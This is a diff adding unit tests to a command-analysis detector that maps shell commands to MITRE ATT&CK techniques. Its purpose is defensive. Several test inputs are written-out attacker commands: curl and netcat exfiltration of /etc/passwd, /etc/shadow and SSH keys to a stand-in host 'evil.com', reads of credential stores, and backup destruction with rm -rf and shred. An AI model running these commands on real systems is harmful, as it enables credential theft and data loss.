@@ -638,3 +638,355 @@ class TestIntegrationWithCommandHandler:
         assert "current_stage" in summary
         assert "risk_level" in summary
         assert "technique_count" in summary
+
+
+# =============================================================================
+# Tests for Phase 1 Enhancement - 12 New MITRE ATT&CK Techniques (April 2026)
+# =============================================================================
+
+
+class TestT1033SystemOwnerUserDiscovery:
+    """Tests for T1033 - System Owner/User Discovery."""
+
+    def test_w_command(self):
+        """Test 'w' command detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("w", state)
+        assert any(i.technique_id == "T1033" for i in indicators)
+        assert "reconnaissance" in state.stages_seen
+
+    def test_users_command(self):
+        """Test 'users' command detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("users", state)
+        assert any(i.technique_id == "T1033" for i in indicators)
+
+    def test_last_a_command(self):
+        """Test 'last -a' command detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("last -a", state)
+        assert any(i.technique_id == "T1033" for i in indicators)
+
+    def test_finger_command(self):
+        """Test 'finger' command detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("finger", state)
+        assert any(i.technique_id == "T1033" for i in indicators)
+
+    def test_cat_wtmp(self):
+        """Test direct wtmp access detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat /var/log/wtmp", state)
+        assert any(i.technique_id == "T1033" for i in indicators)
+
+
+class TestT1049SystemNetworkConnectionsDiscovery:
+    """Tests for T1049 - System Network Connections Discovery."""
+
+    def test_ss_tulpn(self):
+        """Test 'ss -tulpn' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("ss -tulpn", state)
+        assert any(i.technique_id == "T1049" for i in indicators)
+        assert "reconnaissance" in state.stages_seen
+
+    def test_ss_anp(self):
+        """Test 'ss -anp' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("ss -anp", state)
+        assert any(i.technique_id == "T1049" for i in indicators)
+
+    def test_lsof_i(self):
+        """Test 'lsof -i' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("lsof -i", state)
+        assert any(i.technique_id == "T1049" for i in indicators)
+
+    def test_netstat_tulpn(self):
+        """Test 'netstat -tulpn' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("netstat -tulpn", state)
+        assert any(i.technique_id == "T1049" for i in indicators)
+
+    def test_cat_proc_net_tcp(self):
+        """Test /proc/net/tcp access detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat /proc/net/tcp", state)
+        assert any(i.technique_id == "T1049" for i in indicators)
+
+
+class TestT1018RemoteSystemDiscovery:
+    """Tests for T1018 - Remote System Discovery."""
+
+    def test_nmap(self):
+        """Test nmap detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("nmap -sP 192.168.1.0/24", state)
+        assert any(i.technique_id == "T1018" for i in indicators)
+        assert "reconnaissance" in state.stages_seen
+
+    def test_ping_c(self):
+        """Test 'ping -c' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("ping -c 1 192.168.1.1", state)
+        assert any(i.technique_id == "T1018" for i in indicators)
+
+    def test_arp_a(self):
+        """Test 'arp -a' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("arp -a", state)
+        assert any(i.technique_id == "T1018" for i in indicators)
+
+    def test_host_lookup(self):
+        """Test 'host' command detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("host example.com", state)
+        assert any(i.technique_id == "T1018" for i in indicators)
+
+    def test_dig_lookup(self):
+        """Test 'dig' command detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("dig example.com", state)
+        assert any(i.technique_id == "T1018" for i in indicators)
+
+    def test_cat_etc_hosts(self):
+        """Test /etc/hosts access detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat /etc/hosts", state)
+        assert any(i.technique_id == "T1018" for i in indicators)
+
+
+class TestT1007SystemServiceDiscovery:
+    """Tests for T1007 - System Service Discovery."""
+
+    def test_systemctl_list_units(self):
+        """Test 'systemctl list-units' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("systemctl list-units", state)
+        assert any(i.technique_id == "T1007" for i in indicators)
+        assert "reconnaissance" in state.stages_seen
+
+    def test_service_status_all(self):
+        """Test 'service --status-all' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("service --status-all", state)
+        assert any(i.technique_id == "T1007" for i in indicators)
+
+    def test_chkconfig_list(self):
+        """Test 'chkconfig --list' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("chkconfig --list", state)
+        assert any(i.technique_id == "T1007" for i in indicators)
+
+    def test_ls_init_d(self):
+        """Test 'ls /etc/init.d' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("ls /etc/init.d", state)
+        assert any(i.technique_id == "T1007" for i in indicators)
+
+
+class TestT1069PermissionGroupsDiscovery:
+    """Tests for T1069 - Permission Groups Discovery."""
+
+    def test_groups_command(self):
+        """Test 'groups' command detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("groups", state)
+        assert any(i.technique_id == "T1069" for i in indicators)
+        assert "reconnaissance" in state.stages_seen
+
+    def test_cat_etc_group(self):
+        """Test 'cat /etc/group' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat /etc/group", state)
+        assert any(i.technique_id == "T1069" for i in indicators)
+
+    def test_getent_group(self):
+        """Test 'getent group' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("getent group sudo", state)
+        assert any(i.technique_id == "T1069" for i in indicators)
+
+
+class TestT1222FilePermissionsModification:
+    """Tests for T1222 - File and Directory Permissions Modification."""
+
+    def test_chmod_777(self):
+        """Test 'chmod 777' detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("chmod 777 /var/www/html", state)
+        assert any(i.technique_id == "T1222" for i in indicators)
+        assert "defense_evasion" in state.stages_seen
+
+    def test_chmod_suid(self):
+        """Test SUID bit manipulation detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("chmod +s /tmp/backdoor", state)
+        assert any(i.technique_id == "T1222" for i in indicators)
+        assert "privilege_escalation" in state.stages_seen
+
+    def test_chattr_remove_immutable(self):
+        """Test immutable attribute removal detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("chattr -i /etc/passwd", state)
+        assert any(i.technique_id == "T1222" for i in indicators)
+
+
+class TestT1036Masquerading:
+    """Tests for T1036 - Masquerading."""
+
+    def test_cp_to_usr_bin(self):
+        """Test binary copy to system path detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cp /tmp/evil /usr/bin/normal", state)
+        assert any(i.technique_id == "T1036" for i in indicators)
+        assert "defense_evasion" in state.stages_seen
+
+    def test_alias_creation(self):
+        """Test alias creation detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("alias ls='ls -la; nc attacker 4444'", state)
+        assert any(i.technique_id == "T1036" for i in indicators)
+
+    def test_path_manipulation(self):
+        """Test PATH manipulation detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("export PATH=/tmp/evil:$PATH", state)
+        assert any(i.technique_id == "T1036" for i in indicators)
+
+
+class TestT1119AutomatedCollection:
+    """Tests for T1119 - Automated Collection."""
+
+    def test_find_sensitive_files(self):
+        """Test automated search for sensitive files detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("find / -name '*.pem'", state)
+        assert any(i.technique_id == "T1119" for i in indicators)
+        assert "collection" in state.stages_seen
+
+    def test_locate_keys(self):
+        """Test locate for keys detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("locate .key", state)
+        assert any(i.technique_id == "T1119" for i in indicators)
+
+    def test_recursive_password_grep(self):
+        """Test recursive password grep detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("grep -r password /etc", state)
+        assert any(i.technique_id == "T1119" for i in indicators)
+
+
+class TestT1041ExfiltrationOverC2:
+    """Tests for T1041 - Exfiltration Over C2 Channel."""
+
+    def test_curl_post_file(self):
+        """Test curl POST file exfiltration detection."""
+        state = init_ttp_state()
+        indicators = analyze_command(
+            "curl -X POST http://evil.com -d @/etc/passwd", state
+        )
+        assert any(i.technique_id == "T1041" for i in indicators)
+        assert "exfiltration" in state.stages_seen
+
+    def test_curl_data_binary(self):
+        """Test curl binary data exfiltration detection."""
+        state = init_ttp_state()
+        indicators = analyze_command(
+            "curl --data-binary @/root/.ssh/id_rsa http://evil.com", state
+        )
+        assert any(i.technique_id == "T1041" for i in indicators)
+
+    def test_nc_file_redirect(self):
+        """Test netcat file exfiltration detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("nc evil.com 4444 < /etc/shadow", state)
+        assert any(i.technique_id == "T1041" for i in indicators)
+
+    def test_cat_pipe_nc(self):
+        """Test cat piped to netcat detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat /etc/passwd | nc evil.com 4444", state)
+        assert any(i.technique_id == "T1041" for i in indicators)
+
+
+class TestT1555CredentialsFromPasswordStores:
+    """Tests for T1555 - Credentials from Password Stores."""
+
+    def test_gpg_keyring_access(self):
+        """Test GPG keyring access detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat /root/.gnupg/secring.gpg", state)
+        assert any(i.technique_id == "T1555" for i in indicators)
+        assert "credential_access" in state.stages_seen
+
+    def test_pass_store_access(self):
+        """Test pass password store access detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat /home/user/.password-store/email.gpg", state)
+        assert any(i.technique_id == "T1555" for i in indicators)
+
+    def test_keepassxc_cli(self):
+        """Test KeePassXC CLI access detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("keepassxc-cli show db.kdbx entry", state)
+        assert any(i.technique_id == "T1555" for i in indicators)
+
+    def test_netrc_access(self):
+        """Test netrc credentials access detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cat ~/.netrc", state)
+        assert any(i.technique_id == "T1555" for i in indicators)
+
+
+class TestT1490InhibitSystemRecovery:
+    """Tests for T1490 - Inhibit System Recovery."""
+
+    def test_rm_backups(self):
+        """Test backup directory deletion detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("rm -rf /var/backups", state)
+        assert any(i.technique_id == "T1490" for i in indicators)
+        assert "impact" in state.stages_seen
+
+    def test_shred_backup(self):
+        """Test secure backup deletion detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("shred -u backup.tar.gz", state)
+        assert any(i.technique_id == "T1490" for i in indicators)
+
+    def test_lvremove_snapshot(self):
+        """Test LVM snapshot removal detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("lvremove /dev/vg0/snapshot", state)
+        assert any(i.technique_id == "T1490" for i in indicators)
+
+    def test_disable_backup_service(self):
+        """Test backup service disable detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("systemctl disable backup.service", state)
+        assert any(i.technique_id == "T1490" for i in indicators)
+
+
+class TestT1074DataStaged:
+    """Tests for T1074 - Data Staged."""
+
+    def test_hidden_staging_dir(self):
+        """Test hidden staging directory creation detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("mkdir /tmp/.hidden_stage", state)
+        assert any(i.technique_id == "T1074" for i in indicators)
+        assert "collection" in state.stages_seen
+
+    def test_cp_to_tmp(self):
+        """Test file staged to temp location detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("cp /etc/shadow /tmp/data", state)
+        assert any(i.technique_id == "T1074" for i in indicators)
+
+    def test_tar_to_staging(self):
+        """Test archive creation in staging location detection."""
+        state = init_ttp_state()
+        indicators = analyze_command("tar -cf /tmp/exfil.tar /home", state)
+        assert any(i.technique_id == "T1074" for i in indicators)
